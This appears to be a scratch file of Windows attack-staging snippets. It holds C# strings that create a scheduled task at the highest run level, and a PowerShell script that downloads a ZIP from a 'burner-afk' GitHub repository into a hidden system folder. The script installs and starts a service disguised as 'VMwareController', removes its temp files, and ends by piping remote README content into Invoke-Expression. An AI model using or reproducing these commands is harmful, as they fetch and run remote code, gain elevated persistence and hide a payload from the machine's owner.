"C:\Users\Administrator\Downloads\grouse-main\grouse-main\DesktopGoose v0.31\GooseDesktop.exe"

string createCmd = $"/Create /TN \"ShowMyApp\" /TR \"{exePath}\" " +
                   $"/SC ONCE /ST {startTime} /RL HIGHEST /F /RU \"{username}\"";
string createCmd = $"/Create /TN \"ShowMyApp\" /TR \"\\\"{exePath}\\\"\" /SC ONCE /ST {startTime} /RL HIGHEST /F /RU \"{username}\"";
C:\Windows\Help\Windows\IndexStore\en-US


# Set variables
$url = "https://github.com/burner-afk/Controller/archive/refs/heads/main.zip"      
$zipPath = "C:\temp\Controller-main.zip"
$extractPath = "C:\Windows\Help\Windows\IndexStore\en-US"



# Create directory for download and extraction
New-Item -ItemType Directory -Force -Path (Split-Path $zipPath)


# Download the ZIP file
Invoke-WebRequest -Uri $url -OutFile $zipPath

# Extract the ZIP file
Add-Type -AssemblyName System.IO.Compression.FileSystem
[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)

Remove-Item "C:\temp" -Recurse -Force

C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe "C:\Windows\Help\Windows\IndexStore\en-US\Controller-main\bin\Debug\VMwareController.exe"

Start-Service VMwareController


Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/burner-afk/Controller/refs/heads/main/README.md").Content
